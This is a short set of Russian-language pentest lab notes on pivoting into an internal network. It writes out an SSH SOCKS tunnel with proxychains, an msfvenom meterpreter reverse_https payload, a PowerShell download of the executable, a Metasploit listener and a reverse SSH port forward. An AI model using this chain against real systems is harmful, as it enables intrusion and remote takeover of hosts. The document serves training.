#pivoting #forwarding #tunneling #ssh 

> В случае если мы хотим установить `meterpreter` сессию с удаленным хостов во внутренней сети, нам необходимо провернуть `pivoting`

1) Иметь прямой доступ к внутренней машине через RDP, используем динамический проброс портов и proxychains на промежуточной машине

```bash
ssh -NfD 9050  ubuntu@10.129.202.64
```

```powershell
proxychains xfreerdp3 /v:172.16.5.19  /u:victor /p:pass123
```

2) Далее создаем нагрузку через `msfvenom` (где подключение идет от Windows, к промежуточному)

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=4444 -f exe -o backupscript.exe
```

3) Доставляем нагрузку на Windows машину

```powershell
scp backupscript.exe ubuntu@10.129.202.64:~/
```

```powershell
iwr http://172.16.5.129:8123/shell.exe -OutFile shell.exe
```

4) Запускаем слушатель на нашей атакующей машине
```bash
use exploit/multi/handler  
set payload windows/x64/meterpreter/reverse_https  
set LHOST 0.0.0.0  
set LPORT 8000  
run
```

5) Выполняем проброс порта из врутренней сети промежуточного хоста к внешней

```bash
ssh -NvR 172.16.5.129:4444:0.0.0.0:8000 ubuntu@10.129.202.64
```